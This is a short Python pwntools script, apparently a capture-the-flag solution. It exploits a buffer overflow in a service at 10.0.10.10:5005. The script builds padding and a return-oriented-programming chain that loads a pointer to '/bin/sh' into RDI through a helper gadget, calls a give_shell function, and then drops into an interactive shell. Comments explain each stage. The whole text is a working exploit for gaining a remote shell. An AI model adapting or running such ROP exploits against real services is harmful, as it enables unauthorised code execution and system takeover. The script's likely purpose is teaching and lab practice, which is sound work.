from pwn import *

r = remote("10.0.10.10", 5005)

context.log_level = "DEBUG"

r.recvuntil("You know the drill . . . \n")

# ROP chain construction

# padding for reaching the return address
padding = ("a" * 8) + ("a" * 8)

# Set RDI: jump to 0x4005ee (helper) and place two values on the stack that it will consume:
#    0, to fill RSI (we don't care about its value)
#    0x601040, to fill RDI: a pointer to "/bin/sh"
#          (helper)     (rsi=0)  (rdi="/bin/sh")
stage1 = p64(0x4005ee) + p64(0) + p64(0x601040)

# Call give_shell; because rdi = "/bin/sh", we are effectively calling give_shell("/bin/sh")
stage2 = p64(0x4005b7)

r.sendline(padding + stage1 + stage2)

r.interactive()
